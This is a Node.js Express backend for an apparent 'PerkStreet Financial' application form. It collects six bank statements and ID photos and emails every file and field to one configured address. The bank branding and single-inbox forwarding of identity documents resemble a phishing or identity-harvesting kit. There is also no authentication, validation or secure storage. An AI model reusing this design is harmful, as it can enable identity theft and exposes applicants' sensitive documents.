
const express = require("express");
const multer = require("multer");
const path = require("path");
const cors = require("cors");
const sgMail = require("@sendgrid/mail");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 3000;

sgMail.setApiKey(process.env.SENDGRID_API_KEY);
app.use(cors());
app.use(express.static(path.join(__dirname, "../frontend")));

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const cpUpload = upload.fields([
  { name: "statement1" }, { name: "statement2" }, { name: "statement3" },
  { name: "statement4" }, { name: "statement5" }, { name: "statement6" },
  { name: "idFront" }, { name: "idBack" }
]);

app.post("/submit", cpUpload, async (req, res) => {
  const data = req.body;
  const files = req.files;

  let attachments = [];

  for (const key in files) {
    files[key].forEach(file => {
      attachments.push({
        content: file.buffer.toString("base64"),
        filename: file.originalname,
        type: file.mimetype,
        disposition: "attachment"
      });
    });
  }

  const fields = Object.entries(data).map(([key, value]) => `${key}: ${value}`).join("\n");

  const msg = {
    to: process.env.RECEIVER_EMAIL,
    from: process.env.RECEIVER_EMAIL,
    subject: "New PerkStreet Financial Application",
    text: fields,
    attachments: attachments
  };

  try {
    await sgMail.send(msg);
    res.status(200).send("Success");
  } catch (error) {
    console.error("Email error:", error);
    res.status(500).send("Email failed to send.");
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
